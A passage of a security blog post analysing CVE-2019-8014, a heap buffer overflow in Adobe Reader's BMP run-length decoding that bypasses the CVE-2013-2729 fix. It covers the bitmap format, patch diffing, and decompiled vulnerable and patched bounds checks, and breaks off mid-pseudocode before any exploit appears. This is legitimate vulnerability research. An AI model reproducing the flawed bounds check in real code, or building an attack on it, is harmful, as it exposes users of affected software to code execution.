<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Adobe Reader,PDF,CVE-2019-8014,CVE-2013-2729,XFA,BMP,RLE,">





  <link rel="alternate" href="/atom.xml" title="程序人生" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">






<meta name="description" content="This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was fixed six years ago. Thi">
<meta name="keywords" content="Adobe Reader,PDF,CVE-2019-8014,CVE-2013-2729,XFA,BMP,RLE">
<meta property="og:type" content="article">
<meta property="og:title" content="Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago">
<meta property="og:url" content="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/index.html">
<meta property="og:site_name" content="程序人生">
<meta property="og:description" content="This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was fixed six years ago. Thi">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2020-05-20T14:36:22.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago">
<meta name="twitter:description" content="This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was fixed six years ago. Thi">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/">





  <title>Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago | 程序人生</title>
  














</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">程序人生</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Fuzzing / Vulnerability / Exploit</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ke Liu">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="程序人生">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-12T00:13:37+00:00">
                2019-09-12
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/" itemprop="url" rel="index">
                    <span itemprop="name">Vulnerability</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/Analysis/" itemprop="url" rel="index">
                    <span itemprop="name">Analysis</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><em>This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was <del><strong>fixed</strong></del> six years ago. This post also discusses how to exploit the vulnerability.</em></p>
<p>Author: <strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p>
<a id="more"></a>
<h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h2><p>Adobe released security updates for Adobe Acrobat and Reader in <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> in August. As usual, lots of vulnerabilities were fixed in the updates. When I was reviewing the corresponding advisories on <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> , my attention was attracted by one of them: <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> . Following text is the title and description of this case:</p>
<blockquote>
<p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p>
<p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p>
</blockquote>
<p>What surprised me most is that the flaw exists within the parsing of run length encoding in BMP images because I remembered that six years ago a similar case <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> was fixed in Adobe Reader. If you have the same wondering that what’s the relationship between CVE-2013-2729 and CVE-2019-8014, then let me reveal the truth for you.</p>
<p>By the way, the credit of CVE-2019-8014 goes to <code>ktkitty (https://ktkitty.github.io)</code> .</p>
<h2 id="0x02-Debugging-Environment"><a href="#0x02-Debugging-Environment" class="headerlink" title="0x02. Debugging Environment"></a>0x02. Debugging Environment</h2><p>Before diving deep into the details of the vulnerability, let’s set up the debugging environment first. According to <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> , <code>2019.012.20035</code> and earlier versions of Adobe Acrobat and Reader on Windows were affected, and the released version was <code>2019.012.20036</code> . We’ll carry out our analysis on these two versions.</p>
<p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20035</code> :</p>
<ol>
<li>Download and install <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">Download Link</a>)</li>
<li>Upgrade to <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">Download Link</a>)</li>
</ol>
<p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20036</code> :</p>
<ol>
<li>Download and install <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">Download Link</a>)</li>
</ol>
<p>Please remember to disconnect the Internet or disable the <em>Adobe Acrobat Update Service</em> , otherwise your Adobe Acrobat Reader DC will be updated automatically.</p>
<h2 id="0x03-Bitmap-Structures"><a href="#0x03-Bitmap-Structures" class="headerlink" title="0x03. Bitmap Structures"></a>0x03. Bitmap Structures</h2><p>Again, before diving deep into the details of the vulnerability, let’s learn some essential concepts of bitmap images. You can skip this section if you’re already familiar with it.</p>
<h3 id="3-1-Structures"><a href="#3-1-Structures" class="headerlink" title="3.1 Structures"></a>3.1 Structures</h3><p>Generally speaking, a bitmap image is composed of four parts:</p>
<ol>
<li>Bitmap File Header</li>
<li>Bitmap Info Header</li>
<li>RGBQUAD Array</li>
<li>Bitmap Data</li>
</ol>
<h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> structure contains information about the type, size, and layout of the bitmap file. Following is the definition of this structure:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// size of the bitmap file</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// offset of the bitmap bits</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure>
<h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> structure contains information about the dimensions and color format of the bitmap file. Following is the definition of this structure:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// sizeof(BITMAPINFOHEADER)</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// bitmap width</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// bitmap height</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// must be 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// bits per pixel</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// compression method</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// size of bitmap bits</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// horizontal resolution, pixels-per-meter</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// vertical resolution, pixels-per-meter</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// number of color indexes in the color table</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// number of color indexes that are required</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure>
<p>The value of <code>biCompression</code> represents the compression method of the bitmap. Following are some of the possible values of it:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// uncompressed format</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// run-length encoded (RLE) format with 8 bpp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// run-length encoded (RLE) format with 4 bpp</span></span></span><br><span class="line"><span class="comment">// other compression methods...</span></span><br></pre></td></tr></table></figure>
<h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> structure describes a color consisting of relative intensities of red, green, and blue. Following is the definition of this structure:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure>
<p>The elements of the RGBQUAD array make up the color table. The number of entries in the array depends on the values of the <code>biBitCount</code> and <code>biClrUsed</code> members of the <strong>BITMAPINFOHEADER</strong> structure.</p>
<h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>Bits data of the bitmap. The layout of this section depends on the compression method of the bitmap.</p>
<p>One thing should be noted is that usually pixels are stored “bottom-up”, starting in the lower left corner, going from left to right, and then row by row from the bottom to the top of the image [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)].</p>
<h3 id="3-2-Run-Length-Encoding"><a href="#3-2-Run-Length-Encoding" class="headerlink" title="3.2 Run Length Encoding"></a>3.2 Run Length Encoding</h3><p>Two types of <strong>run length encoding</strong> methods can be used in bitmap files: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> .</p>
<h4 id="3-2-1-RLE8"><a href="#3-2-1-RLE8" class="headerlink" title="3.2.1 RLE8"></a>3.2.1 RLE8</h4><p>The RLE8 compression algorithm is used to compress an 8-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p>
<p><strong>Encoded mode</strong> involves two bytes:</p>
<ul>
<li><p>If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the color index that is contained in the second byte.</p>
</li>
<li><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p>
<ul>
<li>0x00 - End of line</li>
<li>0x01 - End of bitmap</li>
<li>0x02 - Delta</li>
</ul>
</li>
</ul>
<p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p>
<p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte represents the number of bytes that follow, each of which contains the color index of a single pixel. In absolute mode, each run is aligned on a word boundary.</p>
<p>The following example shows the hexadecimal contents of an 8-bit compressed bitmap:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure>
<p>The bitmap expands as follows (two-digit values represent a color index for a single pixel):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure>
<h4 id="3-2-2-RLE4"><a href="#3-2-2-RLE4" class="headerlink" title="3.2.2 RLE4"></a>3.2.2 RLE4</h4><p>The RLE4 compression algorithm is used to compress a 4-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p>
<p><strong>Encoded mode</strong> involves two bytes. If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the two color indexes that are contained in the high-order and low-order bits of the second byte.</p>
<p>The first pixel is drawn using the color specified by the high-order 4 bits, the second is drawn using the color in the low-order 4 bits, the third is drawn using the color in the high-order 4 bits, and so on, until all the pixels specified by the first byte have been drawn.</p>
<p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p>
<ul>
<li>0x00 - End of line</li>
<li>0x01 - End of bitmap</li>
<li>0x02 - Delta</li>
</ul>
<p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p>
<p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte contains the number of 4-bit color indexes that follow. Subsequent bytes contain color indexes in their high- and low-order 4 bits, one color index for each pixel. In absolute mode, each run is aligned on a word boundary.</p>
<p>The following example shows the hexadecimal contents of a 4-bit compressed bitmap:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure>
<p>The bitmap expands as follows:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Vulnerability-Details"><a href="#0x04-Vulnerability-Details" class="headerlink" title="0x04. Vulnerability Details"></a>0x04. Vulnerability Details</h2><h3 id="4-1-Code-Identification"><a href="#4-1-Code-Identification" class="headerlink" title="4.1 Code Identification"></a>4.1 Code Identification</h3><p>According to the advisory on ZDI’s website, we know that the flaw exists within the <strong>AcroForm</strong> module. It’s the forms plug-in of Adobe Acrobat Reader DC and is responsible for parsing <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA forms</a> . Following is the path of binary file of this plug-in:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure>
<p>Generally speaking, when doing patch analysis we may want to use <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> to help identify the changed functions between the old and new versions of the binary file. But it won’t be easy to find the target one if too many functions were changed. And that’s the case of <code>AcroForm.api</code> . Here we’ll use some trivial tricks to identify the related functions.</p>
<p>The following analysis was carried out on Adobe Acrobat Reader DC <code>2019.012.20035</code> . The same method can be applied to version <code>2019.012.20036</code> .</p>
<ol>
<li>Search string <code>PNG</code> in IDA and we’ll find one at <code>.rdata:20F9A374</code> </li>
<li>Find cross references to <code>20F9A374</code> and we’ll go to function <code>sub_20CF3A3F</code> </li>
<li>Obviously function <code>sub_20CF3A3F</code> is responsible for identifying the type of the image</li>
<li>Find cross references to <code>sub_20CF3A3F</code> and we’ll go to function <code>sub_20CF4BE8</code> </li>
<li>Function <code>sub_20CF4BE8</code> will call corresponding image parsing functions according to image types</li>
<li>Function <code>sub_20CF3E5F</code> , which will be called by function <code>sub_20CF4870</code> , is responsible for parsing bitmap images</li>
</ol>
<p>The result of BinDiff shows that some basic blocks were changed in function <code>sub_20CF3E5F</code> . Let’s take the basic block which begins at <code>20CF440F</code> as an example to show the difference.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure>
<p>It’s obvious that the code was changed to prevent integer overflow circumstances.</p>
<h3 id="4-2-Vulnerability-Analysis"><a href="#4-2-Vulnerability-Analysis" class="headerlink" title="4.2 Vulnerability Analysis"></a>4.2 Vulnerability Analysis</h3><p>Thanks to <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> , we can quickly understand what’s going on in function <code>sub_20CF3E5F</code> .</p>
<h4 id="4-2-1-RLE8-Decoding"><a href="#4-2-1-RLE8-Decoding" class="headerlink" title="4.2.1 RLE8 Decoding"></a>4.2.1 RLE8 Decoding</h4><p>Following pseudo code, which was extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE8 compressed data.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                         <span class="comment">// means have compressed data</span></span><br><span class="line">        <span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span 